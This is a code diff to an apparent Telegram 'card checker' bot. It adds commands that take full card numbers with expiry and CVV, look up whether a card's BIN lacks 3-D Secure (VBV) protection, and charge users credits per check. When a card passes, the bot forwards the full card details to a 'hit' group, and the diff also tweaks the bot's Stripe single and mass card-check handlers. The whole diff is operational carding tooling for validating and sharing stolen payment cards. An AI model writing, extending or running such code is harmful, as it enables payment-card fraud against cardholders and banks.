+    mapping, valid, malformed, dupes = {}, 0, 0, 0
+    if mtime is not None:
+        try:
+            if path.stat().st_size > VBV_MAX_DB_BYTES:
+                raise ValueError("vbv database exceeds size cap")
+            with open(path, "r", encoding="utf-8", errors="replace") as fh:
+                for raw in fh:
+                    line = raw.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    parts = line.split("|")
+                    if len(parts) < 3:
+                        malformed += 1
+                        continue
+                    key = re.sub(r"\D", "", parts[0])
+                    if len(key) < 6:
+                        malformed += 1
+                        continue
+                    key = key[:6]
+                    valid += 1
+                    if key in mapping:
+                        dupes += 1
+                        continue              # first match wins
+                    mapping[key] = (parts[1].strip(), parts[2].strip())
+        except Exception as e:
+            print(f"⚠️ [VBV] failed to read {path}: {e}")
+
+    _vbv_cache.update({"path": str(path), "mtime": mtime, "map": mapping,
+                       "valid": valid, "malformed": malformed, "dupes": dupes})
+    print(f"📚 [VBV] loaded {valid} BINs from {path} "
+          f"(malformed={malformed}, duplicates={dupes})")
+    return _vbv_cache
+
+
+def _vbv_save_db(lines: List[str]) -> bool:
+    """Atomically rewrite the DB file, then refresh the cache."""
+    path = _vbv_db_path()
+    try:
+        path.parent.mkdir(parents=True, exist_ok=True)
+        tmp = path.with_name(path.name + ".tmp")
+        with open(tmp, "w", encoding="utf-8") as fh:
+            fh.writelines(lines)
+        os.replace(tmp, path)
+        _vbv_load_db(force=True)
+        return True
+    except Exception as e:
+        print(f"❌ [VBV] save failed: {e}")
+        return False
+
+
+def _vbv_usage_text(db: dict) -> str:
+    return (
+        f"<b>𝑽𝑩𝑽 / 𝟑𝑫𝑺 𝑳𝑶𝑶𝑲𝑼𝑷</b> {pe('5895770017458294953', '💫')}\n\n"
+        "Usage: <code>/vbv 4111111111111111|12|29|123</code>\n"
+        "Or reply to a card with <code>/vbv</code>\n\n"
+        f"📚 <b>Database</b> ➛ <code>{db['valid']}</code> BINs\n"
+        f"🗂️ <b>Source</b> ➛ <code>{Path(db['path']).name}</code>\n"
+        f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+    )
+
+
+async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single VBV / 3DS lookup from the local BIN database — /vbv <card>."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    started = time.perf_counter()
+
+    db = _vbv_load_db()
+
+    # ── card source: args, or the message this command replies to ──────
+    raw = " ".join(context.args).strip() if context.args else ""
+    if not raw and message.reply_to_message:
+        raw = (message.reply_to_message.text
+               or message.reply_to_message.caption or "").strip()
+
+    if not raw:
+        await message.reply_text(_vbv_usage_text(db),
+                                 parse_mode=ParseMode.HTML,
+                                 disable_web_page_preview=True)
+        return
+
+    card_str = card_formatter.extract_single_card_from_text(raw)
+    card = None
+    if card_str:
+        p = card_str.split("|")
+        if len(p) == 4:
+            card = {"cc": p[0], "month": p[1], "year": p[2], "cvv": p[3]}
+    if not card:
+        card = parse_card(raw)
+    if not card:
+        await message.reply_text(
+            "❌ <b>Invalid Card</b>\n\n"
+            "Send it as <code>number|month|year|cvv</code>.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    cc = card["cc"]
+    bin_num = cc[:6]
+
+    # ── credit gate (free tier only) ───────────────────────────────────
+    tier = user_manager.get_tier(user_id)
+    if tier == "free" and user_id != OWNER_ID:
+        balance = get_user_credits(user_id)
+        if balance < VBV_CREDIT_COST:
+            await message.reply_text(
+                f"💎 <b>Not enough credits</b>\n\n"
+                f"This check costs <b>{VBV_CREDIT_COST}</b> credit.\n"
+                f"Your balance: <b>{balance}</b>\n\n"
+                f"Use /redeemcredits or /buy for more.",
+                parse_mode=ParseMode.HTML)
+            return
+        deduct_user_credits(user_id, VBV_CREDIT_COST)
+
+    proc = await message.reply_text("🔐 <b>Running VBV lookup…</b>",
+                                    parse_mode=ParseMode.HTML)
+
+    try:
+        # ── BIN metadata (never let a failure kill the lookup) ─────────
+        bin_line = "—"
+        bank_line = "—"
+        country_line = "—"
+        currency = "—"
+        try:
+            bin_info, bank, country_display, currency, _cc = await get_bin_info(cc, user_id)
+            bin_line = bin_info or "—"
+            bank_line = bank or "—"
+            country_line = country_display or "—"
+        except Exception as e:
+            print(f"⚠️ [VBV] bin info error: {e}")
+
+        # ── database lookup ────────────────────────────────────────────
+        if bin_num.startswith("3"):
+            verdict = "unsupported"
+            status, response = "Unsupported", "Unsupported card type."
+        else:
+            entry = db["map"].get(bin_num)
+            if entry:
+                status, response = entry
+                verdict = _vbv_classify(status)
+            else:
+                verdict = "not_found"
+                status, response = "Not Found", "Lookup Card Error"
+
+        verdict_text = {
+            "pass":        "✅ <b>PASSED</b>",
+            "reject":      "❌ <b>REJECTED</b>",
+            "not_found":   "⚠️ <b>NOT FOUND</b>",
+            "unsupported": "⛔ <b>UNSUPPORTED</b>",
+        }[verdict]
+
+        elapsed = time.perf_counter() - started
+
+        # Full card, exactly as it was supplied (4-digit year preserved).
+        full_card = f"{cc}|{card['month']}|{card['year']}|{card['cvv']}"
+
+        # Verdict icon — same premium emoji set as the other single checks.
+        resp_icon = {
+            "pass":        pe("5902002809573740949", "✅"),
+            "reject":      pe("6267039884016358504", "❌"),
+            "not_found":   pe("6282641460093260838", "⚠️"),
+            "unsupported": pe("6282641460093260838", "⚠️"),
+        }[verdict]
+
+        bank_display = bank_line if bank_line and bank_line != "—" else "Unknown"
+        if len(bank_display) > 30:
+            bank_display = bank_display[:27] + "..."
+
+        clean_response = html.escape(str(response))
+        if len(clean_response) > 100:
+            clean_response = clean_response[:97] + "..."
+
+        text = (
+            f"<b>𝑽𝑩𝑽 / 𝟑𝑫𝑺 𝑳𝑶𝑶𝑲𝑼𝑷</b> {pe('5895770017458294953', '💫')}\n\n"
+            f"{pe('5893494861612455015', '⭐️')} 𝗖𝗔𝗥𝗗 ↣ <code>{full_card}</code>\n\n"
+            f"{resp_icon} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean_response}</code>\n\n"
+            f"{pe('5902242339899838759', '🌐')} 𝗕𝗜𝗡 ↣ <b>{bin_line}</b>\n"
+            f"{pe('6041705726206808304', '🚀')} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_display}</b>\n"
+            f"{pe('5904542823167824187', '🗑')} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_line}</b>"
+        )
+        await proc.edit_text(text, parse_mode=ParseMode.HTML,
+                             disable_web_page_preview=True)
+
+        # ── Hit notification: authenticate_successful → alert the hit group ──
+        if "authenticate_successful" in str(response).lower():
+            try:
+                eu = update.effective_user
+                await send_hit_notification(
+                    context,
+                    gateway="𝑽𝑩𝑽 / 𝟑𝑫𝑺 𝑳𝑶𝑶𝑲𝑼𝑷",
+                    card=full_card,
+                    response=str(response),
+                    price="$0",
+                    user={
+                        "id": user_id,
+                        "first_name": getattr(eu, "first_name", "") or "",
+                        "username": getattr(eu, "username", "") or "",
+                        "tier": tier,
+                    },
+                    bin_info=(bin_line, bank_line, country_line, currency, cc[:6]),
+                    status_category="charged",
+                    price_override="$0",
+                )
+            except Exception as e:
+                print(f"⚠️ [VBV] hit notification error: {e}")
+
+    except Exception as e:
+        print(f"❌ [VBV] error: {e}\n{traceback.format_exc()}")
+        # refund the free-tier credit on an internal failure
+        if tier == "free" and user_id != OWNER_ID:
+            try:
+                user_credits[user_id] = get_user_credits(user_id) + VBV_CREDIT_COST
+                save_user_credits()
+            except Exception:
+                pass
+        try:
+            await proc.edit_text(
+                "⚠️ <b>Lookup failed</b>\n\n"
+                "Something went wrong. Please try again.",
+                parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
+
+
+async def addvbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Owner-only: add/replace VBV DB entries — /addvbv BIN|status|response.
+
+    Supports ONE or MANY entries in a single call:
+      • inline, one per ';' → /addvbv 411111|3D TRUE ✅|X; 422222|3D FALSE ❌|Y
+      • multi-line (reply to a text message / .txt file), one per line
+    Later duplicates win; existing BINs are replaced in one atomic write.
+    """
+    if update.effective_user.id != OWNER_ID:
+        return
+    message = update.effective_message
+    replied = message.reply_to_message
+
+    raw = " ".join(context.args).strip() if context.args else ""
+    if not raw and replied:
+        raw = (replied.text or replied.caption or "").strip()
+
+    # Bulk via a replied .txt file.
+    if replied and replied.document:
+        try:
+            tg_file = await replied.document.get_file()
+            blob = await tg_file.download_as_bytearray()
+            file_text = blob.decode("utf-8", errors="ignore")
+            raw = f"{raw}\n{file_text}" if raw else file_text
+        except Exception as e:
+            await message.reply_text(
+                f"❌ <b>Could not read the replied file</b>\n\n"
+                f"<code>{html.escape(str(e)[:120])}</code>",
+                parse_mode=ParseMode.HTML)
+            return
+
+    if not raw:
+        await message.reply_text(
+            "Usage:\n"
+            "<code>/addvbv 411111|3D TRUE ✅|CARD_DECLINED</code>\n\n"
+            "<b>Bulk</b> — one entry per line (or reply to a .txt):\n"
+            "<code>/addvbv\n"
+            "411111|3D TRUE ✅|CARD_DECLINED\n"
+            "422222|3D FALSE ❌|CARD_DECLINED</code>\n\n"
+            "Tip: separate multiple inline entries with <code>;</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    # ── Parse one or many entries (newline- or ';'-separated) ────────────
+    entries, invalid = [], []
+    for ln in raw.replace(";", "\n").splitlines():
+        ln = ln.strip()
+        if not ln or ln.startswith("#"):
+            continue
+        parts = ln.split("|", 2)          # response may itself contain '|'
+        if len(parts) < 3 or not re.sub(r"\D", "", parts[0]):
+            invalid.append(ln)
+            continue
+        key = re.sub(r"\D", "", parts[0])[:6]
+        if len(key) < 6:
+            invalid.append(ln)
+            continue
+        entries.append((key, parts[1].strip(), parts[2].strip()))
+
+    if not entries:
+        await message.reply_text(
+            "❌ <b>No valid entries found.</b>\n\n"
+            "Each line must be <code>BIN|status|response</code>.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    # ── Merge into the DB in one atomic write (later lines win) ──────────
+    path = _vbv_db_path()
+    lines = []
+    if path.exists():
+        with open(path, "r", encoding="utf-8", errors="replace") as fh:
+            lines = fh.readlines()
+
+    replace_keys = {k for k, _, _ in entries}
+    kept = [ln for ln in lines
+            if not (ln.strip()
+                    and re.sub(r"\D", "", ln.split("|")[0])[:6] in replace_keys)]
+    for key, status, response in entries:
+        kept.append(f"{key}|{status}|{response}\n")
+
+    if not _vbv_save_db(kept):
+        await message.reply_text("❌ Failed to write the VBV database.",
+                                 parse_mode=ParseMode.HTML)
+        return
+
+    # ── Report ───────────────────────────────────────────────────────────
+    shown = entries[:20]
+    summary = "\n".join(
+        f"🔢 <code>{k}</code> ➛ <code>{html.escape(s)}</code> | "
+        f"<code>{html.escape(r)}</code>"
+        for k, s, r in shown
+    )
+    if len(entries) > len(shown):
+        summary += f"\n… and {len(entries) - len(shown)} more"
+
+    report = (f"✅ <b>Saved {len(entries)} "
+              f"entr{'y' if len(entries) == 1 else 'ies'}</b>\n\n{summary}")
+    if invalid:
+        report += (f"\n\n⚠️ <b>Skipped {len(invalid)} invalid line(s):</b>\n"
+                   + "\n".join(f"<code>{html.escape(x[:40])}</code>"
+                               for x in invalid[:5]))
+    await message.reply_text(report, parse_mode=ParseMode.HTML)
+
+
+async def rmbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Owner-only: remove a VBV DB entry — /rmvbv BIN."""
+    if update.effective_user.id != OWNER_ID:
+        return
+    message = update.effective_message
+
+    if not context.args:
+        await message.reply_text("Usage: <code>/rmvbv 411111</code>",
+                                 parse_mode=ParseMode.HTML)
+        return
+
+    key = re.sub(r"\D", "", " ".join(context.args))[:6]
+    path = _vbv_db_path()
+    if not path.exists():
+        await message.reply_text("❌ VBV database not found.",
+                                 parse_mode=ParseMode.HTML)
+        return
+
+    with open(path, "r", encoding="utf-8", errors="replace") as fh:
+        lines = fh.readlines()
+
+    kept = [ln for ln in lines
+            if not (ln.strip() and ln.split("|")[0].strip() == key)]
+    removed = len(lines) - len(kept)
+
+    if removed == 0:
+        await message.reply_text(
+            f"⚠️ No entry found for BIN <code>{key}</code>.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if _vbv_save_db(kept):
+        await message.reply_text(
+            f"🗑️ <b>Removed {removed} entr{'y' if removed == 1 else 'ies'}</b>\n"
+            f"🔢 BIN ➛ <code>{key}</code>",
+            parse_mode=ParseMode.HTML, reply_markup=back_menu())
+    else:
+        await message.reply_text("❌ Failed to write the VBV database.",
+                                 parse_mode=ParseMode.HTML)
+
+
 def main():
     print("=" * 80)
     print("💰 ULTRA MULTI-USER CARD CHECKER BOT - v3.0")
@@ -86000,6 +86334,10 @@ def main():
     # ============ OTHER COMMANDS ============
     app.add_handler(CommandHandler("testpremium", test_premium_command))
     app.add_handler(CommandHandler("bin", bin_command))
+    # ============ VBV / 3DS LOOKUP (single check) ============
+    app.add_handler(CommandHandler("vbv", vbv_command))
+    app.add_handler(CommandHandler("addvbv", addvbv_command))
+    app.add_handler(CommandHandler("rmvbv", rmbv_command))
     app.add_handler(CommandHandler("poolstatus", pool_status_command))
     app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(CommandHandler("debugreply", debug_reply_command))
@@ -86079,8 +86417,8 @@ def main():
     
 
     # ============ STRIPE CHK COMMANDS ============
-    app.add_handler(CommandHandler("chk", single_check_stripe_chk))
-    app.add_handler(CommandHandler("mchk", mass_check_stripe_chk_command))
+    app.add_handler(CommandHandler("chk", single_check_stripe_chk, block=False))
+    app.add_handler(CommandHandler("mchk", mass_check_stripe_chk_command, block=False))
     
 
     
